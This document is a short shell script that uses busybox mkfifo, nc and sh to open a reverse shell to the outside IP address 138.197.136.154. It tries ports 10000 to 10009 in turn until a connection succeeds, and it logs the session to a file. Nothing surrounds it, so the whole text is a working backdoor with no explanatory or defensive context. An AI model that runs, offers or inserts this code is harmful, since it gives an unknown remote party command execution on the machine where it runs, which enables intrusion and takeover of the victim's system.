for PORT in 10000 10001 10002 10003 10004 10005 10006 10007 10008 10009
do
   echo $PORT > port.txt
   ./busybox mkfifo backpipe
   ./busybox nc 138.197.136.154 $PORT < backpipe | tee log.txt | ./busybox sh &> backpipe
   if grep -Fxq "Connected" log.txt
   then
      break
   else
      continue
   fi
done
